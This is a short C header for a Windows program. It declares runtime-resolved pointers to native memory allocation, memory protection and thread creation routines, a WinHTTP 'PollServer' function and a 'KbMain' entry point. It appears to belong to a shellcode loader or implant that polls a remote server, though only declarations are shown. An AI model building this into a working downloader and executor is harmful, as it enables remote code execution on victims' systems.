#pragma once
#pragma comment(lib, "ntdll.lib")
#include <windows.h>
#include <winhttp.h>

// #define DEBUG
#ifdef DEBUG
#include <stdio.h>
#define dbgp(msg) printf("%s\n", msg)
#else
#define dbgp(msg)
#endif

typedef NTSTATUS(NTAPI *tNtAllocateVirtualMemory)(
  HANDLE ProcessHandle, 
  PVOID *BaseAddress, 
  ULONG_PTR ZeroBits,
  PSIZE_T RegionSize, 
  ULONG AllocationType, 
  ULONG Protect
);
typedef NTSTATUS(NTAPI *tNtProtectVirtualMemory)(
  HANDLE ProcessHandle,
  PVOID *BaseAddress,
  PSIZE_T RegionSize,
  ULONG NewProtect,
  PULONG OldProtect
);
typedef NTSTATUS(NTAPI *tNtFreeVirtualMemory)(
  HANDLE ProcessHandle,
  PVOID *BaseAddress,
  PSIZE_T RegionSize,
  ULONG FreeType
);
typedef NTSTATUS(NTAPI *tRtlCreateUserThread)(
  IN HANDLE ProcessHandle, 
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN BOOLEAN CreateSuspended, 
  IN ULONG StackZeroBits,
  IN OUT PULONG StackReserved, 
  IN OUT PULONG StackCommit,
  IN PVOID StartAddress, 
  IN PVOID StartParameter, 
  OUT PHANDLE ThreadHandle,
  OUT PVOID ClientID
);

extern tNtAllocateVirtualMemory pNtAllocateVirtualMemory;
extern tNtProtectVirtualMemory pNtProtectVirtualMemory;
extern tNtFreeVirtualMemory pNtFreeVirtualMemory;
extern tRtlCreateUserThread pRtlCreateUserThread;

BOOL NTPointers();
HINTERNET PollServer(HINTERNET hSession);
int KbMain();